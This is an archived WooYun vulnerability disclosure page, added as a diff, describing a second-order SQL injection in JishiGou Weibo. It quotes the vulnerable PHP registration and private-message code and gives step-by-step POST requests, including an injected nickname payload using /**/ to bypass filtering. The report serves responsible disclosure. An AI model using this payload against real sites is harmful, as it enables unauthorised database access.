@@ -1,0 +1,412 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		记事狗微博二次注射漏洞  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		记事狗微博二次注射漏洞  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/Chora">Chora</a> 
+</li><li>提交时间：		2013-11-19 22:57</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-11-19：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-11-21：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-11-24：	细节向第三方安全合作伙伴开放<br/>
+									2013-12-01：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-12-11：	细节向普通白帽子公开<br/>
+									2013-12-31：	细节向实习白帽子公开<br/>
+									2014-02-17：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">这个漏洞可以写个自动化攻击程序，但是混口饭吃而已，认真你就输了。。。建议贵公司把最新补丁打包到源码安装包里面，不然上次的漏洞有详细利用方法，新用户会受到牵连。<br />
+官方下的版本，然后去你们官方博客里找了最新的补丁都打上了。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">modules/member.mod.php<br />
+<br />
+</p><pre><code>function DoRegister()<br />
+	{<br />
+		......<br />
+		/**<br />
+		 * 验证码检查<br />
+		 * 如果开启了注册验证码检查，就校验<br />
+		 */<br />
+		if ($this-&gt;Config[&#039;seccode_enable&#039;]&gt;1 &amp;&amp; $this-&gt;Config[&#039;seccode_register&#039;] &amp;&amp; $this-&gt;yxm_title &amp;&amp; $this-&gt;Config[&#039;seccode_pub_key&#039;] &amp;&amp; $this-&gt;Config[&#039;seccode_pri_key&#039;]) {<br />
+//我们可以看到用了&amp;&amp;而不是||，所以在这个页面注册根本不需要注册码，导致了自动化攻击的实现。<br />
+			$YinXiangMa_response=jlogic(&#039;seccode&#039;)-&gt;CheckYXM(@$_POST[&#039;add_YinXiangMa_challenge&#039;],@$_POST[&#039;add_YXM_level&#039;][0],@$_POST[&#039;add_YXM_input_result&#039;]);<br />
+			if($YinXiangMa_response != &quot;true&quot;){<br />
+				$this-&gt;Messager(&quot;验证码输入错误&quot;,-1);<br />
+			}<br />
+		}<br />
+		/* 邀请处理 */<br />
+		$inviter_member = array();<br />
+		$invite_code = ($this-&gt;Post[&#039;invite_code&#039;] ? $this-&gt;Post[&#039;invite_code&#039;] : $this-&gt;Get[&#039;invite_code&#039;]);<br />
+		$check_result = jsg_member_register_check_invite($invite_code);<br />
+<br />
+		if($regstatus[&#039;invite_enable&#039;] &amp;&amp; !$regstatus[&#039;normal_enable&#039;])<br />
+		{<br />
+			if(!$invite_code)<br />
+			{<br />
+				$this-&gt;Messager(&quot;本站目前需要有好友邀请链接才能注册。&lt;br&gt;&lt;br&gt;看看&lt;a href=\&quot;?mod=topic&amp;code=top\&quot;&gt;达人榜&lt;/a&gt;中有没有你认识的人，让他给你发一个好友邀请。&quot;, null);<br />
+			}<br />
+<br />
+			if(!$check_result)<br />
+			{<br />
+				$this-&gt;Messager(&quot;对不起，您访问的邀请链接不正确或者因邀请数已满而失效，请重新与邀请人索取链接。&quot;, null);<br />
+			}<br />
+		}<br />
+<br />
+		if($check_result[&#039;uid&#039;] &gt; 0)<br />
+		{<br />
+			$inviter_member = jsg_member_info($check_result[&#039;uid&#039;]);<br />
+		}<br />
+		if(!$inviter_member &amp;&amp; $this-&gt;Config[&#039;register_invite_input&#039;])<br />
+		{<br />
+			$inviter_member = jsg_member_info($this-&gt;Post[&#039;inviter_nickname&#039;], &#039;nickname&#039;);<br />
+		}<br />
+<br />
+		/* 接收变量 */<br />
+		$password = $this-&gt;Post[&#039;password&#039;];<br />
+		$email = $this-&gt;Post[&#039;email&#039;];<br />
+		$username = $nickname = $this-&gt;Post[&#039;nickname&#039;];<br />
+<br />
+		/* 密码过滤 */<br />
+		if(strlen($password) &lt; 5) {<br />
+			$this-&gt;Messager(&quot;密码过短，请设置至少5位&quot;,-1);<br />
+		}<br />
+		if($password != $this-&gt;Post[&#039;password2&#039;]) {<br />
+			$this-&gt;Messager(&quot;两次输入的密码不相同&quot;,-1);<br />
+		}<br />
+<br />
+		if($GLOBALS[&#039;_J&#039;][&#039;plugins&#039;][&#039;func&#039;][&#039;reg&#039;]) {<br />
+			hookscript(&#039;reg&#039;, &#039;funcs&#039;, array(&#039;param&#039; =&gt; $this-&gt;Post, &#039;step&#039; =&gt; &#039;check&#039;), &#039;reg&#039;);<br />
+		}<br />
+<br />
+		/* 进行注册 */<br />
+		$uid = jsg_member_register($nickname, $password, $email);//跟进0x01<br />
+......<br />
+	}</code></pre><p class='detail'><br />
+<br />
+include/class/passport.class.php<br />
+<br />
+</p><pre><code>function register($nickname, $password, $email, $username = &#039;&#039;, $ucuid = 0, $role_id = 0) {<br />
+		<br />
+......<br />
+		$nickname = trim(strip_tags($nickname));<br />
+		$jsg_result = $this-&gt;checkname($nickname, 1, $ucuid);//跟进<br />
+		if($jsg_result &lt; 1) {<br />
+			return $jsg_result;<br />
+......<br />
+		$timestamp = time();<br />
+		$sql_datas = array();<br />
+		$sql_datas[&#039;ucuid&#039;] 	= $ucuid;<br />
+		$sql_datas[&#039;salt&#039;]		= jsg_member_salt();<br />
+		$sql_datas[&#039;password&#039;]	= jsg_member_password($password, $sql_datas[&#039;salt&#039;]);<br />
+		$sql_datas[&#039;nickname&#039;]	= $nickname;<br />
+		$sql_datas[&#039;username&#039;]  = ($username ? $username : &#039;&#039;);<br />
+		$sql_datas[&#039;email&#039;] 	= $email;<br />
+		$sql_datas[&#039;role_type&#039;]	= &#039;normal&#039;;<br />
+		$sql_datas[&#039;role_id&#039;] 	= (int) ($GLOBALS[&#039;_J&#039;][&#039;config&#039;][&#039;reg_email_verify&#039;] ? $GLOBALS[&#039;_J&#039;][&#039;config&#039;][&#039;no_verify_email_role_id&#039;] : $GLOBALS[&#039;_J&#039;][&#039;config&#039;][&#039;normal_default_role_id&#039;]);<br />
+		$sql_datas[&#039;invitecode&#039;]= substr(md5(random(32)),-16);<br />
+		$sql_datas[&#039;regdate&#039;]	= $sql_datas[&#039;lastactivity&#039;] = $timestamp;<br />
+		$sql_datas[&#039;regip&#039;]		= $sql_datas[&#039;lastip&#039;] = $ip;<br />
+<br />
+				if ($GLOBALS[&#039;_J&#039;][&#039;config&#039;][&#039;extcredits_enable&#039;])<br />
+		{<br />
+			$credits = ConfigHandler::get(&#039;credits&#039;);<br />
+			foreach ($credits[&#039;ext&#039;] as $_k=&gt;$_v)<br />
+			{<br />
+				if ($_v[&#039;enable&#039;] &amp;&amp; $_v[&#039;default&#039;])<br />
+				{<br />
+					$sql_datas[$_k] = (int) $_v[&#039;default&#039;];<br />
+				}<br />
+			}<br />
+		}<br />
+<br />
+		<br />
+		DB::query(&quot;insert into `&quot; . TABLE_PREFIX . &quot;members` (`&quot; . implode(&quot;`,`&quot;, array_keys($sql_datas)) . &quot;`) values (&#039;&quot;.implode(&quot;&#039;,&#039;&quot;,$sql_datas).&quot;&#039;)&quot;); //这里入库。<br />
+......<br />
+	}<br />
+function checkname($username, $is_nickname = 0, $ucuid = 0, $check_exists = -1) {<br />
+		$username = trim(strip_tags($username));<br />
+<br />
+		<br />
+		$username_len = jstrlen($username);<br />
+		$ulmax = ($is_nickname &amp;&amp; true !== UCENTER ? 50 : 15);//50位足够利用，只要你的语句足够短，所以该例我用了一个回显的注入，而不是盲注，那样就能增加可用数量。<br />
+        $nickname_length = (int) $GLOBALS[&#039;_J&#039;][&#039;config&#039;][&#039;nickname_length&#039;];<br />
+        $is_nickname &amp;&amp; $ulmax = !$nickname_length ? $ulmax : ($nickname_length &gt;$ulmax ? $ulmax : $nickname_length);<br />
+<br />
+		if($username_len &lt; 3 || $username_len &gt; $ulmax)<br />
+		{<br />
+			return -1;<br />
+		}<br />
+<br />
+				if($ucuid &lt; 1)<br />
+		{<br />
+						if(is_numeric($username)) {<br />
+				return -1;<br />
+			}<br />
+<br />
+			<br />
+			if($is_nickname)<br />
+			{<br />
+												if(false != preg_match(&#039;~[\&lt;\&gt;\?\@\$\#\[\]\{\}\s]+~&#039;,$username)) //虽然过滤了空格跟其他字符，但是我们可以提交/**/来绕过。<br />
+				{<br />
+					return -1;<br />
+				}<br />
+							}<br />
+			else<br />
+			{<br />
+								if((false == preg_match(&#039;~^[\w\d\_]+$~&#039;,$username)))<br />
+				{<br />
+					return -1;<br />
+				}<br />
+			}<br />
+		}<br />
+......<br />
+	}</code></pre><p class='detail'><br />
+<br />
+modules/ajax/pm.mod.php<br />
+<br />
+</p><pre><code>function send()<br />
+	{<br />
+		$uid = intval($this-&gt;Post[&#039;uid&#039;]);<br />
+				$member = DB::fetch_first(&quot;SELECT nickname FROM &quot;.DB::table(&quot;members&quot;).&quot; WHERE uid=&#039;{$uid}&#039;&quot;);<br />
+		if (empty($member)) {<br />
+			Mobile::error(&quot;No User&quot;, 300);<br />
+		}<br />
+		$to_user = $member[&#039;nickname&#039;]; //出库<br />
+		$data = array(<br />
+			&#039;to_user&#039; =&gt; $to_user,<br />
+			&#039;message&#039; =&gt; trim($this-&gt;Post[&#039;message&#039;]),<br />
+		);<br />
+		$ret = $this-&gt;MyPmLogic-&gt;pmSend($data);//跟进0x02<br />
+		if ($ret == 0) {<br />
+			Mobile::success(&quot;Success&quot;);<br />
+		} else if ($ret == 1) {<br />
+			Mobile::error(&quot;Content not emtpy&quot;, 420);<br />
+		} else if ($ret == 2) {<br />
+			Mobile::error(&quot;Content not emtpy&quot;, 321);<br />
+		} else if (ret == 3) {<br />
+			Mobile::error(&quot;Content not emtpy&quot;, 321);<br />
+		}<br />
+		Mobile::error(&quot;Unkonw error&quot;, 250);<br />
+	}</code></pre><p class='detail'><br />
+<br />
+include/logic/pm.logic.php 0x02<br />
+<br />
+</p><pre><code>function pmSend($post,$suid=MEMBER_ID,$susername=MEMBER_NAME,$snickname=MEMBER_NICKNAME){<br />
+				if(jaccess(&#039;pm&#039;,&#039;send&#039;, $suid)==false) {<br />
+			return 6;<br />
+		}<br />
+<br />
+		$to_user_list=array();<br />
+		$f_rets = filter($post[&#039;message&#039;]);<br />
+		if($f_rets)<br />
+		{<br />
+			if($f_rets[&#039;error&#039;])<br />
+			{<br />
+				return $f_rets[&#039;msg&#039;];<br />
+			}<br />
+		}<br />
+<br />
+		$post[&#039;subject&#039;]=jhtmlspecialchars(trim($post[&#039;subject&#039;]));<br />
+		if($post[&#039;message&#039;]==&#039;&#039;)<br />
+		{<br />
+			return 1;<br />
+		}<br />
+		if ($post[&#039;buddy_list&#039;]==false &amp;&amp; $post[&#039;to_user&#039;]==&quot;&quot;)<br />
+		{<br />
+			return 2;<br />
+		}<br />
+<br />
+		if(trim($post[&#039;to_user&#039;])!=&#039;&#039;)<br />
+		{<br />
+			$in=$this-&gt;DatabaseHandler-&gt;BuildIn($post[&#039;to_user&#039;],&quot;nickname&quot;);<br />
+			<br />
+						$sql=&quot;<br />
+			SELECT<br />
+				`uid`,`username`,`nickname`,`notice_pm`,`email`,`email_checked`,`newpm`,`at_new`,`event_new`,`fans_new`,`vote_new`,`qun_new`,`dig_new`,`channel_new`,`comment_new`,`user_notice_time`,`lastactivity`<br />
+			FROM<br />
+				&quot;.TABLE_PREFIX.&#039;members&#039;.&quot;<br />
+			WHERE<br />
+				$in&quot;;<br />
+			$query = $this-&gt;DatabaseHandler-&gt;Query($sql);//引入引号进行注入。<br />
+<br />
+			while($row=$query-&gt;GetRow())<br />
+			{<br />
+......<br />
+	}</code></pre><p class='detail'><br />
+<br />
+POST<br />
+<br />
+email=www@wooyun.org&amp;password=12345&amp;password2=12345&amp;nickname=woo<br />
+<br />
+到<br />
+<br />
+http://localhost/jishigou/index.php?mod=member&amp;code=doregister<br />
+<br />
+先注册一个woo用户，用于回显。<br />
+<br />
+然后POST<br />
+<br />
+email=Chora@wooyun.org&amp;password=12345&amp;password2=12345&amp;nickname=woo&#039;)and/**/1=1/**/and(&#039;1<br />
+<br />
+到<br />
+<br />
+http://localhost/jishigou/index.php?mod=member&amp;code=doregister<br />
+<br />
+引入注入语句。<br />
+<br />
+然后访问自己的主页，查看自己的UID。<br />
+<br />
+最后POST<br />
+<br />
+uid=你的UID&amp;message=wooyun<br />
+<br />
+到<br />
+<br />
+http://localhost/jishigou/mobile/ajax.php?mod=pm&amp;code=send<br />
+<br />
+出发注入。 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><p class="detail"><a href="../images/192005357a1f9d062a8f19af28c0e5621f788e28.png" target="_blank"><img src="../images/192005357a1f9d062a8f19af28c0e5621f788e28.png" alt="1.png" width="600"/></a></p><p class="detail"></p><p class="detail"><a href="../images/19200546cde2fef71cf2a91499edef102a05895c.png" target="_blank"><img src="../images/19200546cde2fef71cf2a91499edef102a05895c.png" alt="2.png" width="600"/></a></p><p class="detail"></p><p class="detail"><a href="../images/1920055535559c407e7c30615755f1032fbfe9a1.png" target="_blank"><img src="../images/1920055535559c407e7c30615755f1032fbfe9a1.png" alt="3.png" width="600"/></a></p><p class="detail"></p><p class="detail"><a href="../images/19200608373ecc8ae554bf00e0df039240f4d930.png" target="_blank"><img src="../images/19200608373ecc8ae554bf00e0df039240f4d930.png" alt="4.png" width="600"/></a></p><p class="detail"></p><p class="detail"><a href="../images/1920061925dda8063a5f85263803a8c68729eac5.png" target="_blank"><img src="../images/1920061925dda8063a5f85263803a8c68729eac5.png" alt="5.png" width="600"/></a></p><p class="detail"></p><p class="detail"><a href="../images/192006317c34746347dbe4cc265b9f42ef6f5669.png" target="_blank"><img src="../images/192006317c34746347dbe4cc265b9f42ef6f5669.png" alt="6.png" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">包养不动了。。。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/Chora" title="Chora">Chora</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-043394" title="记事狗微博二次注射漏洞">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：15 </p>
+													<p class="detail">确认时间：2013-11-21 17:13</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">非常感谢 Chora@乌云 的反馈，正在修理了。。。</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="43394";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
